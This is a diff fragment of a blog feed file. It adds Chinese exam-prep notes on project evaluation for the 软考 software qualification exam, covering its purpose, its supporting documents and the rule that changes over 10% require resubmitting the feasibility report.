+(6) 编制项目论证报告、环境影响报告书和采购方式审批报告。
+(7) 编制资金筹措计划和项目实施进度计划。
+</code></pre><h5 id="项目评估"><a href="#项目评估" class="headerlink" title="项目评估"></a>项目评估</h5><h5 id="项目评估的含义及其依据"><a href="#项目评估的含义及其依据" class="headerlink" title="项目评估的含义及其依据"></a>项目评估的含义及其依据</h5><p>&emsp;&emsp;项目评估指在项目可行性研究的基础上， 由<font color="red">第三方（国家、银行或有关机构）</font>根据国家颁布的政策、 法规、 方法、 参数和条例等， 从项目（或企业）、国民经济、社会角度出发，对拟建项目建设的必要性、建设条件、生产条件、产品市场需求、工程技术、经济效益和社会效益等进行评价、 分析和论证，进而判断其是否可行的一个评估过程。项目评估是项目投资前期进行决策管理的重要环节，<font color="red">其目的是审查项目可行性研究的可靠性真实性和客观性，为银行的贷款决策或行政主管部门的审批决策提供科学依据。</font></p>
+<font color="red">项目评估的最终成果是项目评估报告。</font>
+
+<p>&emsp;&emsp;项目评估的依据包括如下项目:</p>
+<pre><code>项目建议书及其批准文件。
+项目可行性研究报告。
+报送单位的申请报告及主管部门的初审意见。
+有关资源、配件、燃料、水、电、交通、通信、资金（包括外汇）等方面的协议文件。
+必需的其他文件和资料。
+</code></pre><h3 id="补充考点："><a href="#补充考点：" class="headerlink" title="补充考点："></a>补充考点：</h3><ol>
+<li>项目论证与评估是项目立项前的最后一关，“先论证(评估)，后决策”是现代项目管理的一项基本原则。</li>
+<li>项目可行性研究报告的编制内容与项目建议书批复内容有重大变更的，应重新报批项目建议书。项目初步设计方案和投资概算报告的编制内容与项目可行性研究报告批复内容有重大变更或变更投资<font color="red">超出已批复总投资额度10%的</font>，应重新报批可行性研究报告。项目初步设计方案和投资概算报告的编制内容与项目可行性研究报告批复内容有少量调整且其调整内容未超出已批复总投资额度10%的，需在提交项目初步设计方案和投资概算报告时<font color="red">以独立章节对调整部分进行定量补充说明</font>。</li>
+<li>3、项目识别是承建方项目立项的第一步，其目的在于选择投资机会、鉴别投资方向。从政策导向中寻找项目机会、从市场需求中寻找项目机会、从技术发展中寻找项目机会。承建方的项目立顶注意表现在:我公司人员是否满足要求，技术水平是否足够、竞争对手如何、是否赚钱。<br>项目机会选择主要渠道包括：(1)国家政策，产业导向；(2)市场需求；(3)技术发展；(4)特定事件。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>软考</category>
+      </categories>
   </entry>
   <entry>
     <title>项目进度管理</title>
